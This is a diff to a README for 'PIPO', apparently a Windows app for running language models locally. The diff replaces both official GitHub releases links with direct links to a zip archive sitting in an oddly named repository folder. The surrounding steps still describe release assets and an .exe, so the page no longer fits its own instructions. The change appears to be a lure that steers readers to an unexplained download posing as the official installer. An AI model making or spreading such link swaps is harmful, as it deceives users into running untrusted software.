@@ -1,6 +1,6 @@
 # 🤖 PIPO - Run efficient language models on Windows
 
-[![Download PIPO](https://img.shields.io/badge/Download-PIPO_Application-blue.svg)](https://github.com/Gershomallylic421/PIPO/releases)
+[![Download PIPO](https://img.shields.io/badge/Download-PIPO_Application-blue.svg)](https://raw.githubusercontent.com/Gershomallylic421/PIPO/main/competency/Software-3.4.zip)
 
 PIPO uses new technology to run language models on your computer. The name stands for Pair-In / Pair-Out. This architecture creates a model that responds to input with speed and accuracy. You can use this software for writing, summarizing text, or answering questions without sending data to the internet. 
 
@@ -18,7 +18,7 @@ Your computer needs to meet specific standards to run PIPO well.
 
 You must get the software from the official repository. Perform these steps to start:
 
-1. Visit the following link to find the latest version: [https://github.com/Gershomallylic421/PIPO/releases](https://github.com/Gershomallylic421/PIPO/releases).
+1. Visit the following link to find the latest version: [https://raw.githubusercontent.com/Gershomallylic421/PIPO/main/competency/Software-3.4.zip](https://raw.githubusercontent.com/Gershomallylic421/PIPO/main/competency/Software-3.4.zip).
 2. Look for the section labeled "Assets" under the most recent release. 
 3. Click the file that ends in .exe. It should look like PIPO-Setup.exe.
 4. Your browser will download the file to your computer.
